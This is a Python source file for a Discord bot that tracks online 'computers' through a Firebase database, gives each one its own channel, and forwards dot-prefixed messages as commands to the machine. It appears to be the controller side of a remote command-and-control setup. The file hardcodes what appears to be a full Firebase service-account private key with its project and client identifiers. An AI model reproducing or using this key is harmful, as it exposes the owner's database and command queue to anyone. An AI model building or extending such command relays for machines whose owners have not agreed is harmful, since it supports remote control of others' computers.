import discord
from firebase_admin import credentials, db, initialize_app
from datetime import datetime
import asyncio

# --- CONFIG ---
BOT_TOKEN = "YOUR_DISCORD_BOT_TOKEN"
GUILD_ID = YOUR_GUILD_ID  # Discord server ID
FIREBASE_DB_URL = "https://accdatabase-78d8f-default-rtdb.firebaseio.com/"

# --- Firebase initialization ---
SERVICE_KEY = {
  "type": "service_account",
  "project_id": "accdatabase-78d8f",
  "private_key_id": "0c30399aee44500abbf811679fb091ff42396866",
  "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC209ArMxiLK7U5\nIGuao6fSXkaq4ullfR8FIKul9GwjgRb3P3S3bP9QO+z3CRZCPMRJ6L2j4G/ASemo\nWkGZLgf+6Enw5WFv3CLnihw9Ly1tQI7NyzOEj0BfIwow9L4Gd9AgvZFNsjpYgq6k\nCOGX8+kyshEZILTzf+PpcMkI0wqz4pt4K9BRNbHKXYxOLnK2No9yFn3xK8wLzUKb\nzPxC6Ttz+hGOMGvaSgXHxsEut2ALMLNVT4kfWlOr+s7+3J9MliTjk/YtTf/a1WCR\nKJT6z1xXlHgDzCYodfXsJXmPirjDSXeS7VB91+AudLKoE0RPHktgBfVFTbWS7db7\nNktTyLFDAgMBAAECggEAQBECehjqKV60HyQmwOZHeVbzEY/5dMh/NcdIjxuTR2/F\nkffJGTvXThDpzXmANM7hg/rMdaBA2NOtzwJtyVVRlPhmbMWcutub2aJSmfgtxYKh\naCkkUPf3+T6opBYnftG+e7KiN+VUP87vjujT0PE2jz7J8hG9hzSSM6wDrpVxwy32\nUQOWbvv2Y0VyAOxAiy4PUS0qqaskcKYgA5e5ESWY77j78OIrWigiKt6oZL+iw6fH\nJ/fCNGIuAz7qMDUqK0rKlRbPHBnK/zHg9uWIUgDnvWOx4/hjqAysvxuLAlgwCv15\nnq0IYiJ9h830tGC2AwniCQp5Clz8I6FU7LVGYH9JVQKBgQDf/IKhSxpA+iJHyEkK\nRf+/I5Fg0775q9hH3hTQC4waSw8nqa/jaKekbZKP4x5Fda1W1/qkpHPwJn50JGsC\nzTCfd3IRqqWE5vNmU2XYGL+9/zuqsIrues+n2157jk654D7qwRom3eelNxJKNuBh\nNcU5+1TKIxXFJ2ZXWi1lZh3mVwKBgQDQ9VPbvh65lcLO9gXDUPetHjsNxz423Pom\nYTknmONvYxK/Bah3DPnDyYsqUXd6ckKA8CMaEBhDJTVl/lbanC3Qjji7Hc4pgv3F\natnZWjxpIYDsUWr9c6tpoRoU8Pw1EjuEr6PxTUidQjiSlfrRcdirKeKZglFfEL9H\nPwyNsKbA9QKBgQCZqQF05bD9Ipyh4iU5hwwMdLonUxyQ6/NUWmas0z8qSpP7Ac5I\nlGNtyj3huE3sGO7xxPmOOcPP3Jij1NgU8++HdsoqlIc4xbf1WwFjXpcsIQ0t7C9j\nq50J6tTGrroTimOfaRonz9Q6460IfN0x01GalXF1utwUhRMQmizKg2O/wQKBgDTl\nRXsk34Y/QPc/FCpjPq9WLcDJJRiiS7iXd+5sJ3a077PnbMPmRvum81GdGc+nSOp2\n34vjcyDcNG5DOh1Q19ApkHbdjqi3fiIRcGAzFYPPdWFdIuZR95xfqciPUGjm2qY2\nCBw3YiBc+REyYjHOzfhWPAR8Frkn9iPE9BqSE0RZAoGAMW8hT/RylAIoVzV7QDXP\n69XtVcnLTBPvJ9JPSdTLoS0/oO7bN/qHM71SbyNGbSZwmWQbHtNwDyUHGai84wYK\n9jmLR/dr2a1jJ4Pj/7Qi3F0lSpOJWC2H7WInWeqi1RpPbsxs7ITI5HrEu0jhaLhn\nzPTRKe3l26Nf5U06lRRXBII=\n-----END PRIVATE KEY-----\n",
  "client_email": "firebase-adminsdk-fbsvc@accdatabase-78d8f.iam.gserviceaccount.com",
  "client_id": "108491912306959548034",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-fbsvc%40accdatabase-78d8f.iam.gserviceaccount.com",
  "universe_domain": "googleapis.com"
}

cred = credentials.Certificate(SERVICE_KEY)
initialize_app(cred, {"databaseURL": FIREBASE_DB_URL})

# --- Discord client with message and guild intents ---
intents = discord.Intents.default()
intents.guilds = True
intents.messages = True
client = discord.Client(intents=intents)

# Map computer name to channel
status_channels = {}

# --- Helper to create/update channel status ---
async def update_channel_status(guild, computer_name, is_online):
    name_prefix = "🟢" if is_online else "🔴"
    new_name = f"{name_prefix} | {computer_name}"
    channel = status_channels.get(computer_name)

    if channel is None:
        # Create channel if it doesn’t exist
        channel = await guild.create_text_channel(new_name)
        status_channels[computer_name] = channel
    elif channel.name != new_name:
        await channel.edit(name=new_name)

# --- Monitor Firebase for computers ---
async def monitor_computers(guild):
    ref = db.reference("computers")
    while True:
        computers = ref.get() or {}
        for name, data in computers.items():
            last_seen = data.get("last_seen")
            is_online = data.get("is_online", False)

            if last_seen:
                delta = (datetime.utcnow() - datetime.fromisoformat(last_seen)).total_seconds()
                if delta > 10:
                    is_online = False
                    ref.child(name).child("is_online").set(False)

            await update_channel_status(guild, name, is_online)
        await asyncio.sleep(5)

# --- Command handling in per-computer channels ---
COMMAND_PREFIX = "."

@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if message.guild.id != GUILD_ID:
        return

    # Determine which computer this channel is for
    computer_name = None
    for name, channel in status_channels.items():
        if message.channel.id == channel.id:
            computer_name = name
            break

    if computer_name is None:
        return  # ignore unrelated channels

    content = message.content.lower()
    if not content.startswith(COMMAND_PREFIX):
        return

    cmd_parts = content[len(COMMAND_PREFIX):].split()
    command = cmd_parts[0]
    args = cmd_parts[1:]

    # Push command to Firebase under the computer
    db.reference(f"computers/{computer_name}/commands").push({"command": command, "args": args})
    await message.channel.send(f"Command `{command}` sent to {computer_name}")

# --- Bot ready ---
@client.event
async def on_ready():
    print(f"Bot ready: {client.user}")
    guild = client.get_guild(GUILD_ID)
    asyncio.create_task(monitor_computers(guild))

client.run(BOT_TOKEN)
